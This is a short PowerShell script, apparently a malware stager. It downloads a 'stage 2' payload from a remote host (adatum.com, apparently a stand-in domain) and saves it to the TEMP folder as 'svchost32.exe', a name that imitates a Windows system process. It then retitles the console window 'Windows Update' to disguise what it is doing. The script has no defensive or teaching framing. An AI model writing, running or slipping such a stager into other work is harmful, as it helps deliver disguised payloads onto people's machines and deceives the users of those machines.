# Stage helper
$Stage2Url = 'http://adatum.com:80/assets/update.dat'
$WorkingPath = "$env:TEMP\svchost32.exe"
Invoke-WebRequest -Uri $Stage2Url -OutFile $WorkingPath -UseBasicParsing
$Host.UI.RawUI.WindowTitle = "Windows Update"
Write-Output "stage 45 initialized"
